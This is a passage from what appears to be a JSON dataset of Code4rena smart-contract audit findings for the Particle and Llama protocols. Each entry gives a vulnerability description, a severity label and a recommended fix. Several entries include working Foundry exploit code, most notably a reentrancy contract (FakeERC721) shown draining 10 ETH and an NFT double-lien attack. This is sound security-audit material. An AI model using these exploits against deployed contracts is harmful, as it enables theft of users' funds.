auctionStartTime: 0 377:                 }) 378:             ) 379:         ); 380:  381:         // route trade execution to marketplace 382:         _execBuyNftFromMarket(lien.collection, tokenId, amount, useToken, marketplace, tradeData); 383:  384:         // accure interest to lender 385:         interestAccrued[lien.lender] += payableInterest; 386:  387:         // payback PnL to borrower 388:         if (payback > 0) { 389:             payable(lien.borrower).transfer(payback); 390:         } 391:  392:         emit BuyMarketNFT(lienId, tokenId, amount); 393:     } ```  The required funds to purchase the NFT are used from the contract. As we can see in line 361, the `amount` value (which is the purchase price) is subtracted from the borrower's quota (credit and lien price) along with the due interests (`payableInterest`). If the amount weren't enough this calculation would overflow.  The particular issue here is that the function is marked as payable and could potentially receive ETH, but the function doesn't consider any attached value during its implementation.  This might be caused by an initial version of the function that could receive ETH and was later iterated and changed. If the borrower needs to increase their margin they could call the `addCredit()` function.   We can double check this by noting that `msg.value` isn't taken into account in the implementation of `buyNftFromMarket()` or the internal function `_execBuyNftFromMarket()`. This means that any ETH sent to this function will be effectively lost in the contract.  ## Recommendation  Remove the `payable` modifier from the `buyNftFromMarket()` function.    ## Assessed type  Payable"}, {"title": "Gas limited ETH transfers can lead to a denial of service", "html_url": "https://github.com/code-423n4/2023-05-particle-findings/issues/22", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-05-particle-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L212 https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L216 https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L243 https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L389 https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L511 https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L738 https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L744 https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L815   # Vulnerability details  # Gas limited ETH transfers can lead to a denial of service  ETH transfers are executed by using the `transfer()` function which is gas bound and can potentially lead to an accidental denial of service.  ## Impact  The ParticleExchange contract needs to execute ETH transfers in several places across its codebase:   - In `withdrawEthWithInterest()` to transfer the liquidated ETH to the lender and any potential payback to the borrower. - In `_withdrawAccountInterest()` to transfer accrued interests to the lender. - The `buyNftFromMarket()`, `repayWithNft()` and `auctionBuyNft()` functions also need to transfer the payback to the borrower. - In `withdrawTreasury()` to claim treasury fees.  In all of these cases, the method used to send ETH is the `transfer()` function. As stated in the [documentation](https://docs.soliditylang.org/en/v0.8.20/contracts.html#receive-ether-function), this function is limited to 2300 units of gas. If the receiver is a contract then it can only rely on 2300 units of gas to execute its logic. If the call fails due to out of gas, the `transfer()` function reverts, causing the whole transaction to be reverted.  This can be quite problematic as smart wallets and account abstraction are gaining traction and adoption. If the transfer triggers some logic in the receiving contract, the call could potentially be aborted due to gas constraints.  If any of the parties (lender, borrower or treasury) is a contract, then there is potential risk of an accidental denial of service that could prevent calling any of the functions that execute a `transfer()` call.  ## Recommendation  Use the `call()` function to transfer ETH, since this is not limited in gas by the compiler. The OpenZeppelin library contains a utility function called [`sendValue()`](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-sendValue-address-payable-uint256-) that implements this behavior.     ## Assessed type  DoS"}, {"title": "addCredit() DOS Attack", "html_url": "https://github.com/code-423n4/2023-05-particle-findings/issues/16", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-05-particle-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-particle/blob/1caf678bc20c24c96fc8f6b0046383ff0e9d2a6f/contracts/protocol/ParticleExchange.sol#L518   # Vulnerability details  ## Impact DOS Attack  ## Proof of Concept `addCredit()` can be called by anyone, and the `msg.value` is as small as `1 wei`.  Users can modify Lien at a small cost, causing the value stored in `liens[lienId]=keccak256(abi.encode(lien))` to change By front-run, the normal user's transaction `validateLien()` fails the check, thus preventing the user's transaction from being executed  The following methods will be exploited: (most methods with `validateLien()` will be affected) For example. 1. front-run `auctionBuyNft()` is used to prevent others from bidding 2.  front-run  `startLoanAuction()` to prevent the lender from starting the auction 3.  front-run  `stopLoanAuction()` is used to stop Lender from closing the auction etc.   ## Tools Used  ## Recommended Mitigation Steps  1. `addCredit() ` can execute only be the borrower 2. add the modification interval period 3. limit min of msg.value    ## Assessed type  Context"}, {"title": "_execBuyNftFromMarket() Need to determine if NFT can't already be in the contract", "html_url": "https://github.com/code-423n4/2023-05-particle-findings/issues/15", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-03"], "target": "2023-05-particle-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-particle/blob/1caf678bc20c24c96fc8f6b0046383ff0e9d2a6f/contracts/protocol/ParticleExchange.sol#L428   # Vulnerability details  ## Impact Use other Lien's NFTs for repayment  ## Proof of Concept `_execBuyNftFromMarket()` Whether the NFT is in the current contract after buy, to represent the successful buy of NFT  ```solidity     function _execBuyNftFromMarket(         address collection,         uint256 tokenId,         uint256 amount,         uint256 useToken,         address marketplace,         bytes calldata tradeData     ) internal { ...          if (IERC721(collection).ownerOf(tokenId) != address(this) || balanceBefore - address(this).balance != amount) {             revert Errors.InvalidNFTBuy();         }     }     ```  But before executing the purchase, it does not determine whether the NFT is already in the contract  Since the current protocol does not limit an NFT to only one Lien, the `_execBuyNftFromMarket()` does not actually buy NFT, the funds is used to buy other NFTs but still can meet the verification conditions  Example. 1. alice transfer NFT_A to supply Lien[1] 2. bob performs `sellNftToMarket(1)` , and NFT_A is bought by jack 3. jack transfer NFT_A and supply Line[2] (after this NFT_A exists in the contract) 4. bob execute buyNftFromMarket(1), spend the same amount corresponding to the purchase of other NFT such as: tradeData = { buy NFT_K } 5. Step 4 can be passed `IERC721(collection).ownerOf(tokenId) ! = address(this) || balanceBefore - address(this).balance ! = amount` and bob gets an additional NFT_K   Test code:  ```solidity     function testOneNftTwoLien() external {         //0.lender supply lien[0]         _approveAndSupply(lender,_tokenId);         //1.borrower sell to market         _rawSellToMarketplace(borrower, address(dummyMarketplace), 0, _sellAmount);         //2.jack buy nft         address jack = address(0x100);         vm.startPrank(jack);         dummyMarketplace.buyFromMarket(jack,address(dummyNFTs),_tokenId);         vm.stopPrank();         //3.jack  supply lien[1]         _approveAndSupply(jack, _tokenId);                 //4.borrower buyNftFromMarket , don't need buy dummyNFTs ,  buy other nft         OtherDummyERC721 otherDummyERC721 = new OtherDummyERC721(\"otherNft\",\"otherNft\");         otherDummyERC721.mint(address(dummyMarketplace),1);         console.log(\"before borrower balance:\",borrower.balance /  1 ether);         console.log(\"before otherDummyERC721's owner is borrower :\",otherDummyERC721.ownerOf(1)==borrower);         bytes memory tradeData = abi.encodeWithSignature(             \"buyFromMarket(address,address,uint256)\",             borrower,             address(otherDummyERC721),//<--------buy other nft             1         );         vm.startPrank(borrower);         particleExchange.buyNftFromMarket(             _activeLien, 0, _tokenId, _sellAmount, 0, address(dummyMarketplace), tradeData);         vm.stopPrank();         //5.show borrower get 10 ether back , and get  other nft         console.log(\"after borrower balance:\",borrower.balance /  1 ether);         console.log(\"after otherDummyERC721's owner is borrower :\",otherDummyERC721.ownerOf(1)==borrower);      }    contract OtherDummyERC721 is ERC721 {     // solhint-disable-next-line no-empty-blocks     constructor(string memory name, string memory symbol) ERC721(name, symbol) {}      function mint(address to, uint256 tokenId) external {         _safeMint(to, tokenId);     } }  ```  ```console  $ forge test --match testOneNftTwoLien  -vvv  [PASS] testOneNftTwoLien() (gas: 1466296) Logs:   before borrower balance: 0   before otherDummyERC721's owner is borrower : false   after borrower balance: 10   after otherDummyERC721's owner is borrower : true  Test result: ok. 1 passed; 0 failed; finished in 6.44ms ```  ## Tools Used  ## Recommended Mitigation Steps `_execBuyNftFromMarket` to determine the ownerOf() is not equal to the contract address before buying  ```solidity     function _execBuyNftFromMarket(         address collection,         uint256 tokenId,         uint256 amount,         uint256 useToken,         address marketplace,         bytes calldata tradeData     ) internal {         if (!registeredMarketplaces[marketplace]) {             revert Errors.UnregisteredMarketplace();         } +       require(IERC721(collection).ownerOf(tokenId) != address(this),\"NFT is already in contract \") ... ```   ## Assessed type  Context"}, {"title": "_execSellNftToMarket() re-enter steal funds", "html_url": "https://github.com/code-423n4/2023-05-particle-findings/issues/14", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-04"], "target": "2023-05-particle-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-particle/blob/1caf678bc20c24c96fc8f6b0046383ff0e9d2a6f/contracts/protocol/ParticleExchange.sol#L291   # Vulnerability details  ## Impact re-enter steal funds  ## Proof of Concept `_execSellNftToMarket()` The number of changes in the balance to represent whether the corresponding amount has been received  ```solidity     function _execSellNftToMarket(         address collection,         uint256 tokenId,         uint256 amount,         bool pushBased,         address marketplace,         bytes calldata tradeData     ) internal { ...          if (             IERC721(collection).ownerOf(tokenId) == address(this) ||             address(this).balance - ethBefore - wethBefore != amount         ) {             revert Errors.InvalidNFTSell();         }     ```  Since the current contract doesn't have any `nonReentrant` restrictions Then the user can use reentrant and pay only once when multiple `_execSellNftToMarket()`s share the same transfer of funds  Here are some examples. 1. alice supplies a fake NFT_A  2. alice executes sellNftToMarket(), assuming sellAmount=10 3. execSellNftToMarket() inside the `IERC721(collection).safeTransferFrom()` for re-entry. Note: The collection is an arbitrary contract, so `safeTransferFrom()` can be any code. 4. Reenter the execution of another Lien's sellNftToMarket(), and really transfer to amount=10 5. After the above re-entry, go back to step 3, this step does not need to actually pay, because step 4 has been transferred to sellAmount = 10, so it can pass this verification `address(this).balance - ethBefore - wethBefore ! = amount`  so that only one payment is made, reaching the `sellNftToMarket()` twice   Test code:  add to ParticleExchange.t.sol  ```solidity      function testReenter() public{         vm.deal(address(particleExchange),100 ether);                 FakeERC721 fakeERC721 =  new FakeERC721(particleExchange,address(dummyMarketplace),\"fake\",\"fake\");         vm.deal(address(fakeERC721),10 ether);         fakeERC721.execSteal();     }    contract FakeERC721 is ERC721 {     ParticleExchange private particleExchange;     address private marketplace;     uint sellAmount = 10 ether;     constructor(ParticleExchange _particleExchange,address _marketplace, string memory name, string memory symbol) ERC721(name, symbol) {         particleExchange = _particleExchange;         marketplace = _marketplace;     }      function mint(address to, uint256 tokenId) external {         _safeMint(to, tokenId);     }      function execSteal() external {         //0. mint nft and supply lien         uint256 tokenId = 1;         _mint(address(this), tokenId);         _mint(address(this), tokenId + 1);         _setApprovalForAll(address(this),address(particleExchange), true);         //console.log(isApprovedForAll(address(this),address(particleExchange)));         uint256 lienId = particleExchange.supplyNft(address(this), tokenId, sellAmount, 0);         uint256 lienId2 = particleExchange.supplyNft(address(this), tokenId + 1, sellAmount, 0);         uint256 particleExchangeBefore = address(particleExchange).balance;         uint256 fakeNftBefore = address(this).balance;         console.log(\"before particleExchange balance:\",particleExchangeBefore / 1 ether);         console.log(\"before fakeNft balance:\",fakeNftBefore / 1 ether);         //1.sell , reenter pay one but sell two lien         sell(lienId,tokenId,sellAmount);          //2. repay lien 1 get 10 ether funds         particleExchange.repayWithNft(             Lien({                 lender: address(this),                 borrower: address(this),                 collection: address(this),                 tokenId: tokenId,                 price: sellAmount,                 rate: 0,                 loanStartTime: block.timestamp,                 credit: 0,                 auctionStartTime: 0             }),             lienId,             tokenId         );         //3. repay lien 2 get 10 ether funds         particleExchange.repayWithNft(             Lien({                 lender: address(this),                 borrower: address(this),                 collection: address(this),                 tokenId: tokenId + 1,                 price: sellAmount,                 rate: 0,                 loanStartTime: block.timestamp,                 credit: 0,                 auctionStartTime: 0             }),                         lienId2,             tokenId + 1         );                //4.show fakeNft steal funds         console.log(\"after particleExchange balance:\",address(particleExchange).balance/ 1 ether);         console.log(\"after fakeNft balance:\",address(this).balance/ 1 ether);         console.log(\"after particleExchange lost:\",(particleExchangeBefore - address(particleExchange).balance)/ 1 ether);                console.log(\"after fakeNft steal:\",(address(this).balance - fakeNftBefore) / 1 ether);             }      function sell(uint256 lienId,uint256 tokenId,uint256 sellAmount) private{         bytes memory tradeData = abi.encodeWithSignature(             \"sellToMarket(address,address,uint256,uint256)\",             address(particleExchange),             address(this),             tokenId,             sellAmount         );         particleExchange.sellNftToMarket(             Lien({                 lender: address(this),                 borrower: address(0),                 collection: address(this),                 tokenId: tokenId,                 price: sellAmount,                 rate: 0,                 loanStartTime: 0,                 credit: 0,                 auctionStartTime: 0             }),             lienId,             sellAmount,             true,             marketplace,             tradeData         );              }             function safeTransferFrom(         address from,         address to,         uint256 tokenId,         bytes memory data     ) public virtual override {         if(from == address(particleExchange)){             if (tokenId == 1) { //tokenId =1 , reenter , don't pay                 sell(1,tokenId + 1 ,sellAmount);             }else { // tokenId = 2 ,real pay                 payable(address(particleExchange)).transfer(sellAmount);             }         }         _transfer(_ownerOf(tokenId),to,tokenId); //anyone can transfer     }     fallback() external payable {} } ```   ```console $ forge test --match testReenter  -vvv  Running 1 test for test/ParticleExchange.t.sol:ParticleExchangeTest [PASS] testReenter() (gas: 1869563) Logs:   before particleExchange balance: 100   before fakeNft balance: 10   after particleExchange balance: 90   after fakeNft balance: 20   after particleExchange lost: 10   after fakeNft steal: 10 ``` Test result: ok. 1 passed; 0 failed; finished in 4.80ms  ## Tools Used  ## Recommended Mitigation Steps  Add `nonReentrant` restrictions to all Lien-related methods   ## Assessed type  Reentrancy"}, {"title": "withdrawNftWithInterest() possible take away other Lien's NFT", "html_url": "https://github.com/code-423n4/2023-05-particle-findings/issues/13", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-05"], "target": "2023-05-particle-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-particle/blob/1caf678bc20c24c96fc8f6b0046383ff0e9d2a6f/contracts/protocol/ParticleExchange.sol#L183   # Vulnerability details  ## Impact Possible take away other Lien's NFT  ## Proof of Concept `withdrawNftWithInterest()` Used to retrieve NFT The only current restriction is that if you can transfer out of NFT, it means an inactive loan  ```solidity     function withdrawNftWithInterest(Lien calldata lien, uint256 lienId) external override validateLien(lien, lienId) {         if (msg.sender != lien.lender) {             revert Errors.Unauthorized();         }          // delete lien         delete liens[lienId];          // transfer NFT back to lender         /// @dev can withdraw means NFT is currently in contract without active loan,         /// @dev the interest (if any) is already accured to lender at NFT acquiring time         IERC721(lien.collection).safeTransferFrom(address(this), msg.sender, lien.tokenId); ...  ```  However, the current protocol does not restrict the existence of only one Lien in the same NFT  For example, the following scenario.  1. alice transfer NFT_A and supply Lien[1] 2. bob executes `sellNftToMarket()` 3. jack buys NFT_A from the market 4. jack transfers NFT_A and supply Lien[2] 5. alice executing withdrawNftWithInterest(1) is able to get NFT_A successfully (because step 4 NFT_A is already in the contract) This results in the deletion of lien[1], and Lien[2]'s NFT_A is transferred away  The result is: jack's NFT is lost, and bob's funds are also lost   ## Tools Used  ## Recommended Mitigation Steps Need to determine whether there is a Loan ```solidity     function withdrawNftWithInterest(Lien calldata lien, uint256 lienId) external override validateLien(lien, lienId) {         if (msg.sender != lien.lender) {             revert Errors.Unauthorized();         }  +       require(lien.loanStartTime == 0,\"Active Loan\"); ```   ## Assessed type  Context"}, {"title": "New treasury rate should not affect existing loan", "html_url": "https://github.com/code-423n4/2023-05-particle-findings/issues/9", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-05-particle-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-particle/blob/1caf678bc20c24c96fc8f6b0046383ff0e9d2a6f/contracts/protocol/ParticleExchange.sol#L800   # Vulnerability details  ## Impact In the protocol, lenders have to pay a small treasury fee when they claim their interest. The contract owner can change this `_treasuryRate` at any time using the function `setTreasuryRate()`.  ```solidity // @audit treasury rate should not affect existing loan function setTreasuryRate(uint256 rate) external onlyOwner {     if (rate > MathUtils._BASIS_POINTS) {         revert Errors.InvalidParameters();     }     _treasuryRate = rate;     emit UpdateTreasuryRate(rate); }  ```  However, when the admin changes the rate, the new treasury rate will also be applied to active loans, which is not the agreed-upon term between the lenders and borrowers when they supplied the NFT and created the loan.  ## Proof of Concept  Consider the following scenario:  1. Alice and Bob have an active loan with an accumulated interest of 1 ETH and `_treasuryRate = 5%`. 2. The admin suddenly changes the `_treasuryRate` to `50%`. Now, if Alice claims the interest, she needs to pay 0.5 ETH to the treasury and keep 0.5 ETH. 3. Alice can either accept it and keep 0.5 ETH interest or front-run the admin transaction and claim before the `_treasuryRate` is updated. The point is that Alice only agreed to pay a `5%` treasury rate at the beginning, so the new rate should not apply to her.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Consider storing the `treasuryRate` in the loan struct. The loan struct is not kept in storage, so the gas cost will not increase significantly.  Alternatively, consider adding a timelock mechanism to prevent the admin from changing the treasury rate.    ## Assessed type  Other"}, {"title": "Function `_execBuyNftFromMarket()` Fails to Check the Actual ETH Balance in the Contract After Executing the Trade", "html_url": "https://github.com/code-423n4/2023-05-particle-findings/issues/7", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-05-particle-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-particle/blob/1caf678bc20c24c96fc8f6b0046383ff0e9d2a6f/contracts/protocol/ParticleExchange.sol#L420   # Vulnerability details  ## Impact In the function `_execBuyNftFromMarket()`, if the user chooses to use `WETH`, the function deposits ETH and approves the `amount` of WETH to the marketplace. After executing the trade at the marketplace, the function checks that the balance decrease is correct in the end. However, this check only accounts for ETH changes, not WETH changes, which is incorrect. If the trade did not use the full amount of WETH approved to the marketplace, some leftover WETH will remain in the contract. This amount of WETH/ETH will be locked in the contract, even though it should belong to the borrower who was able to get a good offer to buy the NFT at a lower price.  ```solidity if (useToken == 0) {     // use ETH     // solhint-disable-next-line avoid-low-level-calls     (success, ) = marketplace.call{value: amount}(tradeData); } else if (useToken == 1) {     // use WETH     weth.deposit{value: amount}();     weth.approve(marketplace, amount);     // solhint-disable-next-line avoid-low-level-calls          // @audit might not use all amount approved, cause ETH to locked in the protocol     (success, ) = marketplace.call(tradeData);  }  if (!success) {     revert Errors.MartketplaceFailedToTrade(); }  // verify that the declared NFT is acquired and the balance decrease is correct if (IERC721(collection).ownerOf(tokenId) != address(this) || balanceBefore - address(this).balance != amount) {     revert Errors.InvalidNFTBuy(); } ```  ## Proof of Concept Consider the following scenario:  1. Alice (borrower 1) calls `buyNftFromMarket()` to acquire an NFT with a price of 100 WETH. However, she sets the amount to 105 WETH, so the contract deposits and approves 105 WETH to the marketplace. After the trade, there is still 5 WETH approved to the marketplace. 2. Bob (borrower 2) sees the opportunity. He has a much cheaper lien, so he also calls `buyNftFromMarket()` to acquire an NFT with a price of 5 WETH. He specifies the `useToken = 0`. However, he sets the `amount = 0` and actually uses the 5 WETH left in step 1 of Alice to acquire the NFT. The result is Bob is able to steal 5 WETH approved to the marketplace.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Consider accounting for the WETH when checking balance changes in `_execBuyNftFromMarket()`.    ## Assessed type  Invalid Validation"}, {"title": "Marketplace may call `onERC721Received()` and create a lien during `buyNftFromMarket()`, creating divergence", "html_url": "https://github.com/code-423n4/2023-05-particle-findings/issues/3", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-06"], "target": "2023-05-particle-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-particle/blob/1caf678bc20c24c96fc8f6b0046383ff0e9d2a6f/contracts/protocol/ParticleExchange.sol#L81   # Vulnerability details  ## Impact The contract supports a \"push-based\" NFT supply, where the price and rate are embedded in the data bytes. This way, the lender doesn't need to additionally approve the NFT but can just transfer it directly to the contract. However, since the contract also interacts with the marketplace to buy/sell NFT, it has to prevent the issue where the marketplace also sends data bytes, which might tie 1 NFT with 2 different liens and create divergence.   ```solidity function onERC721Received(     address operator,     address from,     uint256 tokenId,     bytes calldata data ) external returns (bytes4) {     if (data.length == 64) {         // @audit marketplace is router so the executor contract might not be whitelisted         if (registeredMarketplaces[operator]) {              /// @dev transfer coming from registeredMarketplaces will go through buyNftFromMarket, where the NFT             /// is matched with an existing lien (realize PnL) already. If procceds here, this NFT will be tied             /// with two liens, which creates divergence.             revert Errors.Unauthorized();         }         /// @dev MAX_PRICE and MAX_RATE should each be way below bytes32         (uint256 price, uint256 rate) = abi.decode(data, (uint256, uint256));         /// @dev the msg sender is the NFT collection (called by safeTransferFrom's _checkOnERC721Received check)         _supplyNft(from, msg.sender, tokenId, price, rate);     }     return this.onERC721Received.selector; } ```  It prevents it by using the `registeredMarketplaces[]` mapping, where it records the address of the marketplace. This check is explicitly commented in the codebase.  However, it is not enough. The protocol plans to integrate with Reservoir's Router contract, so only the Router address is whitelisted in `registeredMarketplaces[]`. But the problem is the address that transfers the NFT is not the Router, but the specific Executor contract, which is not whitelisted.  As a result, the marketplace might bypass this check and create a new lien in `onERC721Received()` during the `buyNftFromMarket()` flow, thus making 2 liens track the same NFT.  ## Proof of Concept Function `_execBuyNftFromMarket()` does a low-level call to the exchange ```solidity // execute raw order on registered marketplace bool success; if (useToken == 0) {     // use ETH     // solhint-disable-next-line avoid-low-level-calls     (success, ) = marketplace.call{value: amount}(tradeData); } else if (useToken == 1) {     // use WETH     weth.deposit{value: amount}();     weth.approve(marketplace, amount);     // solhint-disable-next-line avoid-low-level-calls     (success, ) = marketplace.call(tradeData); } ```  The contract calls to Reservoir's router contract, which then calls to a specific module to execute the buy. https://github.com/reservoirprotocol/indexer/blob/6c89d546d3fb98d5eaa505b9943e89bd91f2e8ec/packages/contracts/contracts/router/ReservoirV6_0_1.sol#L50  ```solidity function _executeInternal(ExecutionInfo calldata executionInfo) internal {   address module = executionInfo.module;    // Ensure the target is a contract   if (!module.isContract()) {     revert UnsuccessfulExecution();   }    (bool success, ) = module.call{value: executionInfo.value}(executionInfo.data);   if (!success) {     revert UnsuccessfulExecution();   } } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps Consider adding a flag that indicates the contract is in the `buyNftFromMarket()` flow and use it as a check in `onERC721Received()`. For example ```solidity _marketBuyFlow = 1; _execBuyNftFromMarket(lien.collection, tokenId, amount, useToken, marketplace, tradeData); _marketBuyFlow = 0; ``` And in `onERC721Receive()` ```solidity if (data.length == 64) {   if(_martketBuyFlow) {     return this.onERC721Received.selector;   } } ```    ## Assessed type  Invalid Validation"}, {"title": "It is not possible to execute actions that require ETH (or other protocol token)", "html_url": "https://github.com/code-423n4/2023-06-llama-findings/issues/247", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-01"], "target": "2023-06-llama-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-llama/blob/main/src/LlamaCore.sol#L334 https://github.com/code-423n4/2023-06-llama/blob/main/src/LlamaExecutor.sol#L29   # Vulnerability details  ## Details Actions can have value attached to them. That means when action is being executed, a certain amount of ETH (or other protocol token) need to be sent by the caller with the contract call. This is why `LlamaCore.executeAction` is payable  ```solidity   function executeAction(ActionInfo calldata actionInfo) external payable { ```  However, when LlamaCore executes the action it doesn't pass value to the downstream call to LlamaExecutor ```solidity     // Execute action.     (bool success, bytes memory result) =       executor.execute(actionInfo.target, actionInfo.value, action.isScript, actionInfo.data); ```  LlamaExecutor's `execute` is not payable even though it does try to pass value to the downstream call ```solidity   function execute(address target, uint256 value, bool isScript, bytes calldata data)     external     returns (bool success, bytes memory result)   {     if (msg.sender != LLAMA_CORE) revert OnlyLlamaCore();     (success, result) = isScript ? target.delegatecall(data) : target.call{value: value}(data);   } ```  This will of course revert because LlamaExecutor is not expected to have any ETH balance.  ## PoC  To reproduce the issue based on the existing tests we can do the following changes: ```diff diff --git a/test/LlamaCore.t.sol b/test/LlamaCore.t.sol index 8135c93..6964846 100644 --- a/test/LlamaCore.t.sol +++ b/test/LlamaCore.t.sol @@ -77,9 +77,9 @@ contract LlamaCoreTest is LlamaTestSetup, LlamaCoreSigUtils {    function _createAction() public returns (ActionInfo memory actionInfo) {      bytes memory data = abi.encodeCall(MockProtocol.pause, (true));      vm.prank(actionCreatorAaron); -    uint256 actionId = mpCore.createAction(uint8(Roles.ActionCreator), mpStrategy1, address(mockProtocol), 0, data, \"\"); +    uint256 actionId = mpCore.createAction(uint8(Roles.ActionCreator), mpStrategy1, address(mockProtocol), 1, data, \"\");      actionInfo = -      ActionInfo(actionId, actionCreatorAaron, uint8(Roles.ActionCreator), mpStrategy1, address(mockProtocol), 0, data); +      ActionInfo(actionId, actionCreatorAaron, uint8(Roles.ActionCreator), mpStrategy1, address(mockProtocol), 1, data);      vm.warp(block.timestamp + 1);    }   @@ -107,7 +107,7 @@ contract LlamaCoreTest is LlamaTestSetup, LlamaCoreSigUtils {    function _executeAction(ActionInfo memory actionInfo) public {      vm.expectEmit();      emit ActionExecuted(actionInfo.id, address(this), actionInfo.strategy, actionInfo.creator, bytes(\"\")); -    mpCore.executeAction(actionInfo); +    mpCore.executeAction{value: actionInfo.value}(actionInfo);        Action memory action = mpCore.getAction(actionInfo.id);      assertEq(action.executed, true);  diff --git a/test/mock/MockProtocol.sol b/test/mock/MockProtocol.sol index 1636808..f6b0e0f 100644 --- a/test/mock/MockProtocol.sol +++ b/test/mock/MockProtocol.sol @@ -21,7 +21,7 @@ contract MockProtocol {      return msg.value;    }   -  function pause(bool isPaused) external onlyOwner { +  function pause(bool isPaused) external payable onlyOwner {      paused = isPaused;    } ```  Now we can run any test that executes this action, for example: `forge test -m test_RevertIf_ActionExecuted`  The test fails with \"EvmError: OutOfFund\".  ## Mitigation  It seems like an important part of protocol functionality that is not working, therefore suggested **High** severity.  The fix is straightforward, making LlamaExecutor.execute payable and passing value in LlamaCore: ```diff diff --git a/src/LlamaCore.sol b/src/LlamaCore.sol index 89d60de..05f1755 100644 --- a/src/LlamaCore.sol +++ b/src/LlamaCore.sol @@ -331,7 +331,7 @@ contract LlamaCore is Initializable {        // Execute action.      (bool success, bytes memory result) = -      executor.execute(actionInfo.target, actionInfo.value, action.isScript, actionInfo.data); +      executor.execute{value: msg.value}(actionInfo.target, actionInfo.value, action.isScript, actionInfo.data);        if (!success) revert FailedActionExecution(result);   diff --git a/src/LlamaExecutor.sol b/src/LlamaExecutor.sol index f92ebc0..fe7127e 100644 --- a/src/LlamaExecutor.sol +++ b/src/LlamaExecutor.sol @@ -28,6 +28,7 @@ contract LlamaExecutor {    /// @return result The data returned by the function being called.    function execute(address target, uint256 value, bool isScript, bytes calldata data)      external +    payable      returns (bool success, bytes memory result)    {      if (msg.sender != LLAMA_CORE) revert OnlyLlamaCore(); ```      ## Assessed type  Payable"}, {"title": "User with disapproval role can gas grief the action executor", "html_url": "https://github.com/code-423n4/2023-06-llama-findings/issues/223", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-06-llama-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-llama/blob/main/src/LlamaCore.sol#L576-L584   # Vulnerability details  ## Impact Because disapprovals can be cast after the minimum queue time has expired (i.e. the action is now executable), a user with the disapproval role can frontrun any execute calls to push the action into the disapproved state and cause the execute call to fail, hence gas griefing the execute caller. This is particularly easy to achieve if a user has a force disapproval role.  ## Proof of Concept During calls to `castDisapproval` there is a call to `_preCastAssertions` which checks that the action is in a queued state. The purpose of this check is to ensure that disapprovals can only be cast after the action was first approved and then queued for execution.  However, the issue is that the action remains in the queue state even after the `minExecutionTime` has been passed. The result is that a malicious user can disapprove an action once it is ready to execute.  Below is a diff to the existing test suite that shows how an action that is ready to be executed could be disapproved just before execution. This isn't demonstrated with a force disapproval role, but that case would be the most harmful in terms of gas griefing.  ``` diff --git a/test/LlamaCore.t.sol b/test/LlamaCore.t.sol index 8135c93..34fd630 100644 --- a/test/LlamaCore.t.sol +++ b/test/LlamaCore.t.sol @@ -1015,8 +1015,12 @@ contract ExecuteAction is LlamaCoreTest {      mpCore.queueAction(actionInfo);      vm.warp(block.timestamp + 6 days);   -    vm.expectEmit(); -    emit ActionExecuted(0, address(this), mpStrategy1, actionCreatorAaron, bytes(\"\")); +    vm.prank(disapproverDave); +    mpCore.castDisapproval(uint8(Roles.Disapprover), actionInfo, \"\"); +    vm.prank(disapproverDrake); +    mpCore.castDisapproval(uint8(Roles.Disapprover), actionInfo, \"\"); + +    vm.expectRevert();      mpCore.executeAction(actionInfo);    } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps I suggest that disapprovals should only be allowed to be cast whilst the timestamp is still less than the `minExecutionTime` of the action. Effectively there is a specified disapproval window. The following lines could be added to `_preCastAssertions`:  ``` if (!isApproval) {     require(block.timestamp < action.minExecutionTime, \"Missed disapproval window\"); } ```   ## Assessed type  Invalid Validation"}, {"title": "LlamaPolicy could be DOS by creating large amount of actions.", "html_url": "https://github.com/code-423n4/2023-06-llama-findings/issues/64", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-03"], "target": "2023-06-llama-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-llama/blob/main/src/LlamaPolicy.sol#L404-#L409 https://github.com/code-423n4/2023-06-llama/blob/main/src/LlamaCore.sol#L516-#L562   # Vulnerability details  ## Impact LlamaPolicy could be DOS by creating large amount of actions.  ## Proof of Concept Currently, when Executor want to set role for a user, he call function 